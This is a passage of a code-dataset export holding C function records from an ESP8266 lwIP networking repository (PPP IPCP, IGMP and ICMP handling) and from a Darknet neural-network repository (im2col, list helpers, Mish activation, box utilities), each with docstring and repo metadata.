VJ_SUPPORT\n    /*\n     * Accept the peer's value of maxslotindex provided that it\n     * is less than what we asked for.  Turn off slot-ID compression\n     * if the peer wants.  Send old-style compress-type option if\n     * the peer wants.\n     */\n    NAKCIVJ(CI_COMPRESSTYPE, neg_vj,\n\t    if (treat_as_reject) {\n\t\ttry_.neg_vj = 0;\n\t    } else if (cilen == CILEN_VJ) {\n\t\tGETCHAR(cimaxslotindex, p);\n\t\tGETCHAR(cicflag, p);\n\t\tif (cishort == IPCP_VJ_COMP) {\n\t\t    try_.old_vj = 0;\n\t\t    if (cimaxslotindex < go->maxslotindex)\n\t\t\ttry_.maxslotindex = cimaxslotindex;\n\t\t    if (!cicflag)\n\t\t\ttry_.cflag = 0;\n\t\t} else {\n\t\t    try_.neg_vj = 0;\n\t\t}\n\t    } else {\n\t\tif (cishort == IPCP_VJ_COMP || cishort == IPCP_VJ_COMP_OLD) {\n\t\t    try_.old_vj = 1;\n\t\t    try_.vj_protocol = cishort;\n\t\t} else {\n\t\t    try_.neg_vj = 0;\n\t\t}\n\t    }\n\t    );\n#endif /* VJ_SUPPORT */\n\n    NAKCIADDR(CI_ADDR, neg_addr,\n\t      if (treat_as_reject) {\n\t\t  try_.neg_addr = 0;\n\t\t  try_.old_addrs = 0;\n\t      } else if (go->accept_local && ciaddr1) {\n\t\t  /* take his idea of our address */\n\t\t  try_.ouraddr = ciaddr1;\n\t      }\n\t      );\n\n#if LWIP_DNS\n    NAKCIDNS(CI_MS_DNS1, req_dns1,\n\t     if (treat_as_reject) {\n\t\t try_.req_dns1 = 0;\n\t     } else {\n\t\t try_.dnsaddr[0] = cidnsaddr;\n\t     }\n\t     );\n\n    NAKCIDNS(CI_MS_DNS2, req_dns2,\n\t     if (treat_as_reject) {\n\t\t try_.req_dns2 = 0;\n\t     } else {\n\t\t try_.dnsaddr[1] = cidnsaddr;\n\t     }\n\t     );\n#endif /* #if LWIP_DNS */\n\n    /*\n     * There may be remaining CIs, if the peer is requesting negotiation\n     * on an option that we didn't include in our request packet.\n     * If they want to negotiate about IP addresses, we comply.\n     * If they want us to ask for compression, we refuse.\n     * If they want us to ask for ms-dns, we do that, since some\n     * peers get huffy if we don't.\n     */\n    while (len >= CILEN_VOID) {\n\tGETCHAR(citype, p);\n\tGETCHAR(cilen, p);\n\tif ( cilen < CILEN_VOID || (len -= cilen) < 0 )\n\t    goto bad;\n\tnext = p + cilen - 2;\n\n\tswitch (citype) {\n#if VJ_SUPPORT\n\tcase CI_COMPRESSTYPE:\n\t    if (go->neg_vj || no.neg_vj ||\n\t\t(cilen != CILEN_VJ && cilen != CILEN_COMPRESS))\n\t\tgoto bad;\n\t    no.neg_vj = 1;\n\t    break;\n#endif /* VJ_SUPPORT */\n\tcase CI_ADDRS:\n\t    if ((!go->neg_addr && go->old_addrs) || no.old_addrs\n\t\t|| cilen != CILEN_ADDRS)\n\t\tgoto bad;\n\t    try_.neg_addr = 0;\n\t    GETLONG(l, p);\n\t    ciaddr1 = htonl(l);\n\t    if (ciaddr1 && go->accept_local)\n\t\ttry_.ouraddr = ciaddr1;\n\t    GETLONG(l, p);\n\t    ciaddr2 = htonl(l);\n\t    if (ciaddr2 && go->accept_remote)\n\t\ttry_.hisaddr = ciaddr2;\n\t    no.old_addrs = 1;\n\t    break;\n\tcase CI_ADDR:\n\t    if (go->neg_addr || no.neg_addr || cilen != CILEN_ADDR)\n\t\tgoto bad;\n\t    try_.old_addrs = 0;\n\t    GETLONG(l, p);\n\t    ciaddr1 = htonl(l);\n\t    if (ciaddr1 && go->accept_local)\n\t\ttry_.ouraddr = ciaddr1;\n\t    if (try_.ouraddr != 0)\n\t\ttry_.neg_addr = 1;\n\t    no.neg_addr = 1;\n\t    break;\n#if LWIP_DNS\n\tcase CI_MS_DNS1:\n\t    if (go->req_dns1 || no.req_dns1 || cilen != CILEN_ADDR)\n\t\tgoto bad;\n\t    GETLONG(l, p);\n\t    try_.dnsaddr[0] = htonl(l);\n\t    try_.req_dns1 = 1;\n\t    no.req_dns1 = 1;\n\t    break;\n\tcase CI_MS_DNS2:\n\t    if (go->req_dns2 || no.req_dns2 || cilen != CILEN_ADDR)\n\t\tgoto bad;\n\t    GETLONG(l, p);\n\t    try_.dnsaddr[1] = htonl(l);\n\t    try_.req_dns2 = 1;\n\t    no.req_dns2 = 1;\n\t    break;\n#endif /* LWIP_DNS */\n#if 0 /* UNUSED - WINS */\n\tcase CI_MS_WINS1:\n\tcase CI_MS_WINS2:\n\t    if (cilen != CILEN_ADDR)\n\t\tgoto bad;\n\t    GETLONG(l, p);\n\t    ciaddr1 = htonl(l);\n\t    if (ciaddr1)\n\t\ttry_.winsaddr[citype == CI_MS_WINS2] = ciaddr1;\n\t    break;\n#endif /* UNUSED - WINS */\n\tdefault:\n\t    break;\n\t}\n\tp = next;\n    }\n\n    /*\n     * OK, the Nak is good.  Now we can update state.\n     * If there are any remaining options, we ignore them.\n     */\n    if (f->state != PPP_FSM_OPENED)\n\t*go = try_;\n\n    return 1;\n\nbad:\n    IPCPDEBUG((\"ipcp_nakci: received bad Nak!\"));\n    return 0;\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Delaying membership report for a group if necessary\n *\n * @param group the igmp_group for which \"delaying\" membership report\n * @param maxresp query delay\n */\n", "func_signal": "static void\nigmp_delaying_member(struct igmp_group *group, u8_t maxresp)", "code": "{\n  if ((group->group_state == IGMP_GROUP_IDLE_MEMBER) ||\n     ((group->group_state == IGMP_GROUP_DELAYING_MEMBER) &&\n      ((group->timer == 0) || (maxresp < group->timer)))) {\n    igmp_start_timer(group, maxresp);\n    group->group_state = IGMP_GROUP_DELAYING_MEMBER;\n  }\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Send an icmp packet in response to an incoming packet.\n *\n * @param p the input packet for which the 'unreachable' should be sent,\n *          p->payload pointing to the IP header\n * @param type Type of the ICMP header\n * @param code Code of the ICMP header\n */\n", "func_signal": "static void \nicmp_send_response(struct pbuf *p, u8_t type, u8_t code)", "code": "{\n  struct pbuf *q;\n  struct ip_hdr *iphdr;\n  /* we can use the echo header here */\n  struct icmp_echo_hdr *icmphdr;\n  ip_addr_t iphdr_src;\n\n  /* ICMP header + IP header + 8 bytes of data */\n  q = pbuf_alloc(PBUF_IP, sizeof(struct icmp_echo_hdr) + IP_HLEN + ICMP_DEST_UNREACH_DATASIZE,\n                 PBUF_RAM);\n  if (q == NULL) {\n    LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_time_exceeded: failed to allocate pbuf for ICMP packet.\\n\"));\n    return;\n  }\n  LWIP_ASSERT(\"check that first pbuf can hold icmp message\",\n             (q->len >= (sizeof(struct icmp_echo_hdr) + IP_HLEN + ICMP_DEST_UNREACH_DATASIZE)));\n\n  iphdr = (struct ip_hdr *)p->payload;\n  LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_time_exceeded from \"));\n  ip_addr_debug_print(ICMP_DEBUG, &(iphdr->src));\n  LWIP_DEBUGF(ICMP_DEBUG, (\" to \"));\n  ip_addr_debug_print(ICMP_DEBUG, &(iphdr->dest));\n  LWIP_DEBUGF(ICMP_DEBUG, (\"\\n\"));\n\n  icmphdr = (struct icmp_echo_hdr *)q->payload;\n  icmphdr->type = type;\n  icmphdr->code = code;\n  icmphdr->id = 0;\n  icmphdr->seqno = 0;\n\n  /* copy fields from original packet */\n  SMEMCPY((u8_t *)q->payload + sizeof(struct icmp_echo_hdr), (u8_t *)p->payload,\n          IP_HLEN + ICMP_DEST_UNREACH_DATASIZE);\n\n  /* calculate checksum */\n  icmphdr->chksum = 0;\n  icmphdr->chksum = inet_chksum(icmphdr, q->len);\n  ICMP_STATS_INC(icmp.xmit);\n  /* increase number of messages attempted to send */\n  snmp_inc_icmpoutmsgs();\n  /* increase number of destination unreachable messages attempted to send */\n  snmp_inc_icmpouttimeexcds();\n  ip_addr_copy(iphdr_src, iphdr->src);\n  ip_output(q, NULL, &iphdr_src, ICMP_TTL, 0, IP_PROTO_ICMP);\n  pbuf_free(q);\n}", "path": "src\\lwip-esp\\core\\ipv4\\icmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/*\n * ipcp_cilen - Return length of our CI.\n * Called by fsm_sconfreq, Send Configure Request.\n */\n", "func_signal": "static int ipcp_cilen(fsm *f)", "code": "{\n    ppp_pcb *pcb = f->pcb;\n    ipcp_options *go = &pcb->ipcp_gotoptions;\n#if VJ_SUPPORT\n    ipcp_options *wo = &pcb->ipcp_wantoptions;\n#endif /* VJ_SUPPORT */\n    ipcp_options *ho = &pcb->ipcp_hisoptions;\n\n#define LENCIADDRS(neg)\t\t(neg ? CILEN_ADDRS : 0)\n#if VJ_SUPPORT\n#define LENCIVJ(neg, old)\t(neg ? (old? CILEN_COMPRESS : CILEN_VJ) : 0)\n#endif /* VJ_SUPPORT */\n#define LENCIADDR(neg)\t\t(neg ? CILEN_ADDR : 0)\n#if LWIP_DNS\n#define LENCIDNS(neg)\t\tLENCIADDR(neg)\n#endif /* LWIP_DNS */\n#if 0 /* UNUSED - WINS */\n#define LENCIWINS(neg)\t\tLENCIADDR(neg)\n#endif /* UNUSED - WINS */\n\n    /*\n     * First see if we want to change our options to the old\n     * forms because we have received old forms from the peer.\n     */\n    if (go->neg_addr && go->old_addrs && !ho->neg_addr && ho->old_addrs)\n\tgo->neg_addr = 0;\n\n#if VJ_SUPPORT\n    if (wo->neg_vj && !go->neg_vj && !go->old_vj) {\n\t/* try an older style of VJ negotiation */\n\t/* use the old style only if the peer did */\n\tif (ho->neg_vj && ho->old_vj) {\n\t    go->neg_vj = 1;\n\t    go->old_vj = 1;\n\t    go->vj_protocol = ho->vj_protocol;\n\t}\n    }\n#endif /* VJ_SUPPORT */\n\n    return (LENCIADDRS(!go->neg_addr && go->old_addrs) +\n#if VJ_SUPPORT\n\t    LENCIVJ(go->neg_vj, go->old_vj) +\n#endif /* VJ_SUPPORT */\n\t    LENCIADDR(go->neg_addr) +\n#if LWIP_DNS\n\t    LENCIDNS(go->req_dns1) +\n\t    LENCIDNS(go->req_dns2) +\n#endif /* LWIP_DNS */\n#if 0 /* UNUSED - WINS */\n\t    LENCIWINS(go->winsaddr[0]) +\n\t    LENCIWINS(go->winsaddr[1]) +\n#endif /* UNUSED - WINS */\n\t    0);\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/*\n** \u4ece\u8f93\u5165\u7684\u591a\u901a\u9053\u6570\u7ec4im\uff08\u5b58\u50a8\u56fe\u50cf\u6570\u636e\uff09\u4e2d\u83b7\u53d6\u6307\u5b9a\u884c\uff0c\u5217\uff0c\u901a\u9053\u6570\u5904\u7684\u5143\u7d20\u503c\n** im:  \u51fd\u6570\u7684\u8f93\u5165\uff0c\u6240\u6709\u7684\u6570\u636e\u5b58\u6210\u4e00\u4e2a\u4e00\u7ef4\u6570\u7ec4\n** height: \u6bcf\u4e00\u4e2a\u901a\u9053\u7684\u9ad8\u5ea6(\u5373\u662f\u8f93\u5165\u56fe\u50cf\u7684\u771f\u6b63\u9ad8\u5ea6\uff0c\u88650\u4e4b\u524d)\n** width: \u6bcf\u4e00\u4e2a\u901a\u9053\u7684\u5bbd\u5ea6(\u5373\u662f\u8f93\u5165\u56fe\u50cf\u7684\u771f\u6b63\u5bbd\u5ea6\uff0c\u88650\u4e4b\u524d)\n** channles\uff1a \u8f93\u5165\u901a\u9053\u6570\n** row: \u8981\u63d0\u53d6\u7684\u5143\u7d20\u6240\u5728\u7684\u884c(padding\u4e4b\u540e\u7684\u884c\u6570)\n** col: \u8981\u63d0\u53d6\u7684\u5143\u7d20\u6240\u5728\u7684\u5217(padding\u4e4b\u540e\u7684\u5217\u6570)\n** channel: \u8981\u63d0\u53d6\u7684\u5143\u7d20\u6240\u5728\u7684\u901a\u9053\n** pad: \u56fe\u50cf\u4e0a\u4e0b\u5de6\u53f3\u88650\u7684\u4e2a\u6570\uff0c\u56db\u5468\u662f\u4e00\u6837\u7684\n** \u8fd4\u56deim\u4e2dchannel\u901a\u9053\uff0crow-pad\u884c,col-pad\u5217\u5904\u7684\u5143\u7d20\u503c\n** \u5728im\u4e2d\u5e76\u6ca1\u6709\u5b58\u50a8\u88650\u7684\u5143\u7d20\u503c\uff0c\u56e0\u6b64height\uff0cwidth\u90fd\u662f\u6ca1\u6709\u88650\u65f6\u8f93\u5165\u56fe\u50cf\u771f\u6b63\u7684\u9ad8\u3001\u5bbd\uff1b\n** \u800crow\u4e0ecol\u5219\u662f\u88650\u4e4b\u540e\uff0c\u5143\u7d20\u6240\u5728\u7684\u884c\u5217\uff0c\u56e0\u6b64\uff0c\u8981\u51c6\u786e\u83b7\u53d6\u5728im\u4e2d\u7684\u5143\u7d20\u503c\uff0c\u9996\u5148\u9700\u8981\n** \u51cf\u53bbpad\u4ee5\u83b7\u53d6\u5728im\u4e2d\u771f\u5b9e\u7684\u884c\u5217\u6570\n*/\n", "func_signal": "float im2col_get_pixel(float *im, int height, int width, int channels,\n                        int row, int col, int channel, int pad)", "code": "{\n\t//\u51cf\u53bb\u88650\u957f\u5ea6\uff0c\u83b7\u53d6\u50cf\u7d20\u771f\u5b9e\u7684\u884c\u5217\u6570\n    row -= pad;\n    col -= pad;\n\t// \u5982\u679c\u884c\u5217\u6570<0\uff0c\u6216\u8005\u8d85\u8fc7height/width\uff0c\u5219\u8fd4\u56de0(\u521a\u597d\u662f\u88650\u7684\u6548\u679c)\n    if (row < 0 || col < 0 ||\n        row >= height || col >= width) return 0;\n\t// im\u5b58\u50a8\u591a\u901a\u9053\u4e8c\u7ef4\u56fe\u50cf\u7684\u6570\u636e\u683c\u5f0f\u4e3a: \u5404\u4e2a\u901a\u9053\u6240\u6709\u7684\u6240\u6709\u884c\u5e76\u62101\u884c\uff0c\u518d\u591a\u901a\u9053\u4f9d\u6b21\u5e76\u6210\u4e00\u884c\n    // \u56e0\u6b64width*height*channel\u9996\u5148\u79fb\u4f4d\u5230\u6240\u5728\u901a\u9053\u7684\u8d77\u70b9\u4f4d\u7f6e\uff0c\u518d\u52a0\u4e0awidth*row\u79fb\u4f4d\u5230\u6240\u5728\u6307\u5b9a\n    // \u901a\u9053\u884c\uff0c\u518d\u52a0\u4e0acol\u79fb\u4f4d\u5230\u6240\u5728\u5217\n    return im[col + width*(row + height*channel)];\n}", "path": "src\\im2col.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// \u4e8c\u7ef4\u6307\u9488\uff0c\u8fd9\u91cc\u7684\u64cd\u4f5c\u662f\u5c06\u94fe\u8868l\u4e2d\u6240\u6709\u8282\u70b9\u7684\u503c\u8fdb\u884c\u4fdd\u5b58\uff0c\n// \u56e0\u4e3a\u6bcf\u4e2a\u8282\u70b9\u91cc\u4fdd\u5b58\u7684\u503c\u662f void\u7c7b\u578b\u7684\u6307\u9488\uff0c\u6545\u6307\u9488\u7684\u6307\u9488\uff0c\u5373\u4e8c\u7ef4\u6307\u9488\n", "func_signal": "void **list_to_array(list *l)", "code": "{\n\t//\u3000\u5206\u914d\u5b58\u50a8\u7a7a\u95f4\uff0c\u957f\u5ea6l-size, \u6bcf\u4e2a\u7a7a\u95f4\u5927\u5c0f\u4e3a\u4e00\u4e2avoid\u7c7b\u578b\u6307\u9488\n    void** a = (void**)xcalloc(l->size, sizeof(void*));\n    int count = 0;\n    node *n = l->front; // \u5de5\u4f5c\u6307\u9488n\u6307\u5411\u5934\u8282\u70b9\n    while(n){\n\t\t// \u5c06\u5de5\u4f5c\u6307\u9488n\u6307\u5411\u8282\u70b9\u7684\u503c\u4fdd\u5b58\u5230a\u4e2d\n        a[count++] = n->val;\n        n = n->next; // \u66f4\u65b0\u5de5\u4f5c\u6307\u9488\n    }\n    return a;\n}", "path": "src\\list.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "//\u521d\u59cb\u5316\u94fe\u8868\n", "func_signal": "list *make_list()", "code": "{\n    list* l = (list*)xmalloc(sizeof(list));\n    l->size = 0;\n    l->front = 0;\n    l->back = 0;\n    return l;\n}", "path": "src\\list.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// https://github.com/digantamisra98/Mish\n", "func_signal": "void activate_array_mish(float *x, const int n, float * activation_input, float * output)", "code": "{\n    const float MISH_THRESHOLD = 20;\n    int i;\n    #pragma omp parallel for\n    for (i = 0; i < n; ++i) {\n        float x_val = x[i];\n        activation_input[i] = x_val;    // store value before activation\n        output[i] = x_val * tanh_activate( softplus_activate(x_val, MISH_THRESHOLD) );\n    }\n}", "path": "src\\activations.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// \u91ca\u653e\u6574\u4e2a\u94fe\u8868l\u7684\u5b58\u50a8\u7a7a\u95f4\n", "func_signal": "void free_list(list *l)", "code": "{\n    free_node(l->front);\n    free(l);\n}", "path": "src\\list.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "// Absolute box from relative coordinate bounding box and image size\n", "func_signal": "boxabs box_to_boxabs(const box* b, const int img_w, const int img_h, const int bounds_check)", "code": "{\n    boxabs ba;\n    ba.left = (b->x - b->w / 2.)*img_w;\n    ba.right = (b->x + b->w / 2.)*img_w;\n    ba.top = (b->y - b->h / 2.)*img_h;\n    ba.bot = (b->y + b->h / 2.)*img_h;\n\n    if (bounds_check) {\n        if (ba.left < 0) ba.left = 0;\n        if (ba.right > img_w - 1) ba.right = img_w - 1;\n        if (ba.top < 0) ba.top = 0;\n        if (ba.bot > img_h - 1) ba.bot = img_h - 1;\n    }\n\n    return ba;\n}", "path": "src\\utils.c", "repo_name": "BBuf/Darknet", "stars": 336, "license": "other", "language": "c", "size": 8023}
{"docstring": "/*\n** \u5c06\u8f93\u5165\u56fe\u7247\u8f6c\u4e3a\u4fbf\u4e8e\u8ba1\u7b97\u7684\u6570\u7ec4\u683c\u5f0f\n** data_im: \u8f93\u5165\u56fe\u50cf\n** height: \u8f93\u5165\u56fe\u50cf\u7684\u9ad8\u5ea6(\u884c)\n** width: \u8f93\u5165\u56fe\u50cf\u7684\u5bbd\u5ea6(\u5217)\n** ksize: \u5377\u79ef\u6838\u5c3a\u5bf8\n** stride: \u5377\u79ef\u6838\u8de8\u5ea6\n** pad: \u56db\u5468\u88650\u7684\u957f\u5ea6\n** data_col: \u76f8\u5f53\u4e8e\u8f93\u51fa\uff0c\u4e3a\u8fdb\u884c\u683c\u5f0f\u91cd\u6392\u540e\u7684\u8f93\u5165\u56fe\u50cf\u6570\u636e  \n** \u8f93\u51fadata_col\u7684\u5143\u7d20\u4e2a\u6570\u4e0edata_im\u4e2a\u6570\u4e0d\u76f8\u7b49\uff0c\u4e00\u822c\u6bd4data_im\u4e2a\u6570\u591a\uff0c\u56e0\u4e3astride\u8f83\u5c0f\uff0c\u5404\u4e2a\u5377\u79ef\u6838\u4e4b\u95f4\u6709\u5f88\u591a\u91cd\u53e0\uff0c\n** \u5b9e\u9645data_col\u4e2d\u7684\u5143\u7d20\u4e2a\u6570\u4e3achannels*ksize*ksize*height_col*width_col\uff0c\u5176\u4e2dchannels\u4e3adata_im\u7684\u901a\u9053\u6570\uff0c\n** ksize\u4e3a\u5377\u79ef\u6838\u5927\u5c0f\uff0cheight_col\u548cwidth_col\u5982\u4e0b\u6240\u6ce8\u3002data_col\u7684\u8fd8\u662f\u6309\u884c\u6392\u5217\uff0c\u53ea\u662f\u884c\u6570\u4e3achannels*ksize*ksize,\n** \u5217\u6570\u4e3aheight_col*width_col\uff0c\u5373\u4e00\u5f20\u7279\u5f81\u56fe\u603b\u7684\u5143\u7d20\u4e2a\u6570\uff0c\u6bcf\u6574\u5217\u5305\u542b\u4e0e\u67d0\u4e2a\u4f4d\u7f6e\u5904\u7684\u5377\u79ef\u6838\u8ba1\u7b97\u7684\u6240\u6709\u901a\u9053\u4e0a\u7684\u50cf\u7d20\uff0c\n** \uff08\u6bd4\u5982\u8f93\u5165\u56fe\u50cf\u901a\u9053\u6570\u4e3a3,\u5377\u79ef\u6838\u5c3a\u5bf8\u4e3a3*3\uff0c\u5219\u5171\u670927\u884c\uff0c\u6bcf\u5217\u670927\u4e2a\u5143\u7d20\uff09\uff0c\u4e0d\u540c\u5217\u5bf9\u5e94\u5377\u79ef\u6838\u5728\u56fe\u50cf\u4e0a\u7684\u4e0d\u540c\u4f4d\u7f6e\u505a\u5377\u79ef\n*/\n", "func_signal": "void im2col_cpu(float* data_im,\n     int channels,  int height,  int width,\n     int ksize,  int stride, int pad, float* data_col)", "code": "{\n    int c,h,w;\n\t// \u8ba1\u7b97\u8be5\u5c42\u795e\u7ecf\u7f51\u7edc\u7684\u8f93\u51fa\u56fe\u50cf\u5c3a\u5bf8\uff08\u5176\u5b9e\u6ca1\u6709\u5fc5\u8981\u518d\u6b21\u8ba1\u7b97\u7684\uff0c\u56e0\u4e3a\u5728\u6784\u5efa\u5377\u79ef\u5c42\u65f6\uff0cmake_convolutional_layer()\u51fd\u6570\n    // \u5df2\u7ecf\u8c03\u7528convolutional_out_width()\uff0cconvolutional_out_height()\u51fd\u6570\u6c42\u53d6\u4e86\u8fd9\u4e24\u4e2a\u53c2\u6570\uff0c\n    // \u6b64\u5904\u76f4\u63a5\u4f7f\u7528l.out_h,l.out_w\u5373\u53ef\uff0c\u51fd\u6570\u53c2\u6570\u53ea\u8981\u4f20\u5165\u8be5\u5c42\u7f51\u7edc\u6307\u9488\u5c31\u53ef\u4e86\uff0c\u6ca1\u5fc5\u8981\u5f04\u8fd9\u4e48\u591a\u53c2\u6570\uff09\n    int height_col = (height + 2*pad - ksize) / stride + 1;\n    int width_col = (width + 2*pad - ksize) / stride + 1;\n\t// \u5377\u79ef\u6838\u5927\u5c0f\uff1aksize*ksize\u662f\u4e00\u4e2a\u5377\u79ef\u6838\u7684\u5927\u5c0f\uff0c\u4e4b\u6240\u4ee5\u4e58\u4ee5\u901a\u9053\u6570channels\uff0c\u662f\u56e0\u4e3a\u8f93\u5165\u56fe\u50cf\u6709\u591a\u901a\u9053\uff0c\u6bcf\u4e2a\u5377\u79ef\u6838\u5728\u505a\u5377\u79ef\u65f6\uff0c\n    // \u662f\u540c\u65f6\u5bf9\u540c\u4e00\u4f4d\u7f6e\u591a\u901a\u9053\u7684\u56fe\u50cf\u8fdb\u884c\u5377\u79ef\u8fd0\u7b97\uff0c\u8fd9\u91cc\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e00\u76ee\u7684\uff0c\u5c06\u4e09\u4e2a\u901a\u9053\u5c06\u4e09\u901a\u9053\u4e0a\u7684\u5377\u79ef\u6838\u5e76\u5728\u4e00\u8d77\u4ee5\u4fbf\u8fdb\u884c\u8ba1\u7b97\uff0c\u56e0\u6b64\u5377\u79ef\u6838\n    // \u5b9e\u9645\u4e0a\u5e76\u4e0d\u662f\u4e8c\u7ef4\u7684\uff0c\u800c\u662f\u4e09\u7ef4\u7684\uff0c\u6bd4\u5982\u5bf9\u4e8e3\u901a\u9053\u56fe\u50cf\uff0c\u5377\u79ef\u6838\u5c3a\u5bf8\u4e3a3*3\uff0c\u8be5\u5377\u79ef\u6838\u5c06\u540c\u65f6\u4f5c\u7528\u4e8e\u4e09\u901a\u9053\u56fe\u50cf\u4e0a\uff0c\u8fd9\u6837\u5e76\u8d77\u6765\u5c31\u5f97\n    // \u5230\u542b\u670927\u4e2a\u5143\u7d20\u7684\u5377\u79ef\u6838\uff0c\u4e14\u8fd927\u4e2a\u5143\u7d20\u90fd\u662f\u72ec\u7acb\u7684\u9700\u8981\u8bad\u7ec3\u7684\u53c2\u6570\u3002\u6240\u4ee5\u5728\u8ba1\u7b97\u8bad\u7ec3\u53c2\u6570\u4e2a\u6570\u65f6\uff0c\u4e00\u5b9a\u8981\u6ce8\u610f\u6bcf\u4e00\u4e2a\u5377\u79ef\u6838\u7684\u5b9e\u9645\n    // \u8bad\u7ec3\u53c2\u6570\u9700\u8981\u4e58\u4ee5\u8f93\u5165\u901a\u9053\u6570\u3002\n    int channels_col = channels * ksize * ksize;\n\t// \u5916\u5faa\u73af\u6b21\u6570\u4e3a\u4e00\u4e2a\u5377\u79ef\u6838\u7684\u5c3a\u5bf8\u6570\uff0c\u5faa\u73af\u6b21\u6570\u5373\u4e3a\u6700\u7ec8\u5f97\u5230\u7684data_col\u7684\u603b\u884c\u6570\n    for (c = 0; c < channels_col; ++c) {\n\t\t// \u5217\u504f\u79fb\uff0c\u5377\u79ef\u6838\u662f\u4e00\u4e2a\u4e8c\u7ef4\u77e9\u9635\uff0c\u5e76\u6309\u884c\u5b58\u50a8\u5728\u4e00\u7ef4\u6570\u7ec4\u4e2d\uff0c\u5229\u7528\u6c42\u4f59\u8fd0\u7b97\u83b7\u53d6\u5bf9\u5e94\u5728\u5377\u79ef\u6838\u4e2d\u7684\u5217\u6570\uff0c\u6bd4\u5982\u5bf9\u4e8e\n        // 3*3\u7684\u5377\u79ef\u6838\uff083\u901a\u9053\uff09\uff0c\u5f53c=0\u65f6\uff0c\u663e\u7136\u5728\u7b2c\u4e00\u5217\uff0c\u5f53c=5\u65f6\uff0c\u663e\u7136\u5728\u7b2c2\u5217\uff0c\u5f53c=9\u65f6\uff0c\u5728\u7b2c\u4e8c\u901a\u9053\u4e0a\u7684\u5377\u79ef\u6838\u7684\u7b2c\u4e00\u5217\uff0c\n        // \u5f53c=26\u65f6\uff0c\u5728\u7b2c\u4e09\u5217\uff08\u7b2c\u4e09\u901a\u9053\u4e0a\uff09\n        int w_offset = c % ksize;\n\t\t// \u884c\u504f\u79fb\uff0c\u5377\u79ef\u6838\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7684\u77e9\u9635\uff0c\u4e14\u662f\u6309\u884c\uff08\u5377\u79ef\u6838\u6240\u6709\u884c\u5e76\u6210\u4e00\u884c\uff09\u5b58\u50a8\u5728\u4e00\u7ef4\u6570\u7ec4\u4e2d\u7684\uff0c\n        // \u6bd4\u5982\u5bf9\u4e8e3*3\u7684\u5377\u79ef\u6838\uff0c\u5904\u74063\u901a\u9053\u7684\u56fe\u50cf\uff0c\u90a3\u4e48\u4e00\u4e2a\u5377\u79ef\u6838\u5177\u670927\u4e2a\u5143\u7d20\uff0c\u6bcf9\u4e2a\u5143\u7d20\u5bf9\u5e94\u4e00\u4e2a\u901a\u9053\u4e0a\u7684\u5377\u79ef\u6838\uff08\u4e92\u4e3a\u4e00\u6837\uff09\uff0c\n        // \u6bcf\u5f53c\u4e3a3\u7684\u500d\u6570\uff0c\u5c31\u610f\u5473\u7740\u5377\u79ef\u6838\u6362\u4e86\u4e00\u884c\uff0ch_offset\u53d6\u503c\u4e3a0,1,2\uff0c\u5bf9\u5e943*3\u5377\u79ef\u6838\u4e2d\u7684\u7b2c1, 2, 3\u884c\n        int h_offset = (c / ksize) % ksize;\n\t\t// \u901a\u9053\u504f\u79fb\uff0cchannels_col\u662f\u591a\u901a\u9053\u7684\u5377\u79ef\u6838\u5e76\u5728\u4e00\u8d77\u7684\uff0c\u6bd4\u5982\u5bf9\u4e8e3\u901a\u9053\uff0c3*3\u5377\u79ef\u6838\uff0c\u6bcf\u8fc79\u4e2a\u5143\u7d20\u5c31\u8981\u6362\u4e00\u901a\u9053\u6570\uff0c\n        // \u5f53c=0~8\u65f6\uff0cc_im=0;c=9~17\u65f6\uff0cc_im=1;c=18~26\u65f6\uff0cc_im=2\n        int c_im = c / ksize / ksize;\n\t\t// \u4e2d\u5faa\u73af\u6b21\u6570\u7b49\u4e8e\u8be5\u5c42\u8f93\u51fa\u56fe\u50cf\u884c\u6570height_col\uff0c\u8bf4\u660edata_col\u4e2d\u7684\u6bcf\u4e00\u884c\u5b58\u50a8\u4e86\u4e00\u5f20\u7279\u5f81\u56fe\uff0c\u8fd9\u5f20\u7279\u5f81\u56fe\u53c8\u662f\u6309\u884c\u5b58\u50a8\u5728data_col\u4e2d\u7684\u67d0\u884c\u4e2d\n        for (h = 0; h < height_col; ++h) {\n\t\t\t// \u5185\u5faa\u73af\u7b49\u4e8e\u8be5\u5c42\u8f93\u51fa\u56fe\u50cf\u5217\u6570width_col\uff0c\u8bf4\u660e\u6700\u7ec8\u5f97\u5230\u7684data_col\u603b\u6709channels_col\u884c\uff0cheight_col*width_col\u5217\n            for (w = 0; w < width_col; ++w) {\n\t\t\t\t// \u7531\u4e0a\u9762\u53ef\u77e5\uff0c\u5bf9\u4e8e3*3\u7684\u5377\u79ef\u6838\uff0ch_offset\u53d6\u503c\u4e3a0,1,2,\u5f53h_offset=0\u65f6\uff0c\u4f1a\u63d0\u53d6\u51fa\u6240\u6709\u4e0e\u5377\u79ef\u6838\u7b2c\u4e00\u884c\u5143\u7d20\u8fdb\u884c\u8fd0\u7b97\u7684\u50cf\u7d20\uff0c\n                // 